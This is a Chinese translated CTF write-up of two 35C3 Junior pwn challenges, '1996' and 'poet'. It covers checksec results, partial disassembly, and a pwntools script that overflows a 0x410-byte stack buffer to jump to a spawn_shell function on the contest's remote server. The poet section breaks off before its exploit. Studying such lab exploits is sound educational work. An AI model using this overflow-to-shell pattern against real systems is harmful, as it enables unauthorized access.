# 35C3 Junior pwn笔记（上）

## 译文声明
本文为翻译文章，仅供参考。具体内容及含义以原文为准。

## 前言
在期末复习的压力下，得知了35C3的消息后，我尝试做了一些题目。尽管遇到了非libc的挑战，但在发现还有Junior赛题时，我还是决定去试试这些相对简单的pwn题。虽然在解题过程中还是会遇到困难，但我决定在这次紧张的期末考试结束后，整理一些笔记来记录和复习所学知识。本文将首先讨论那些不基于libc 2.27版本的题目。

## 1996

### 文件检查
按照惯例，先使用`checksec`工具对文件进行安全特性检测：
```bash
➜  1996 checksec 1996
[*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/1996/1996'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 程序分析
由于最近一直在练习阅读汇编代码，因此直接从汇编层面开始分析程序逻辑。以下是`main`函数的汇编代码：

```assembly
Dump of assembler code for function main:
   0x00000000004008cd :    push   rbp
   0x00000000004008ce :    mov    rbp,rsp
   0x00000000004008d1 :    push   rbx
   0x00000000004008d2 :    sub    rsp,0x408
   ...
   0x0000000000400967 :    ret
End of assembler dump.
```

通过观察`main`函数，可以看到它使用`cin`读取用户输入，这类似于C语言中的`gets`函数，存在明显的栈溢出风险。进一步查看`lea rax,[rbp-0x410]`指令，可以确定缓冲区大小为`0x410`字节。

### 漏洞利用
由于程序中提供了一个执行`/bin/sh`的函数`spawn_shell`，我们可以通过栈溢出来劫持控制流到该函数。以下是`spawn_shell`函数的汇编代码：

```assembly
Dump of assembler code for function _Z11spawn_shellv:
   0x0000000000400897 :    push   rbp
   0x0000000000400898 :    mov    rbp,rsp
   0x000000000040089b :    sub    rsp,0x10
   ...
   0x00000000004008cc :    ret
End of assembler dump.
```

以下是一个简单的漏洞利用脚本：

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# n = process('./1996')
n = remote('35.207.132.47', 22227)
elf = ELF('./1996')
sh_addr = 0x0400897

n.recvuntil('?')
n.sendline('a' * (0x410 + 8) + p64(sh_addr))
n.interactive()
```

## poet

### 文件检查
同样，先对`poet`文件进行`checksec`检测：

```bash
➜  poet checksec poet
[*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/poet/poet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 程序运行
简单运行一下程序，了解其大致逻辑：

```bash
➜  poet ./poet
**********************************************************
* We are searching for the poet of the year 2018.        *
* Submit your one line poem now to win an amazing prize! *
**********************************************************
Enter the poem here:
> aaaaaaa
Who is the author of this poem?
> nepire
+---------------------------------------------------------------------------+
THE POEM
aaaaaaa
SCORED 0 POINTS.
SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
YOU MUST SCORE EXACTLY 1000000 POINTS.
TRY AGAIN!
+---------------------------------------------------------------------------+
```

程序要求用户提交一首诗，并根据评分系统给出分数，目标是得到1000000分。接下来，我们查看主要的汇编代码：

```assembly
Dump of assembler code for function main:
   0x000000000040098b :    push   rbx
   0x000000000040098c :    mov    ecx,0x0
   0x0000000000400991 :    mov    edx,0x2
   ...
   0x00000000004009f7 :    call   0x400767
End of assembler dump.
```

`main`函数调用了三个关键函数：`get_poem`、`get_author`和`rate_poem`。以下是这两个函数的汇编代码：

```assembly
Dump of assembler code for function get_poem:
   0x0000000000400935 :    sub    rsp,0x8
   0x0000000000400939 :    lea    rdi,[rip+0x17b]        # 0x400abb
   ...
   0x0000000000400964 :    ret
End of assembler dump.

Dump of assembler code for function get_author:
   0x0000000000400965 :    sub    rsp,0x8
   0x0000000000400969 :    lea    rdi,[rip+0x2a8]        # 0x400c18
   ...
   0x0000000000400981 :    call   0x400630
End of assembler dump.
```

这些函数主要用于获取用户输入的诗和作者信息。具体细节将在后续部分继续探讨。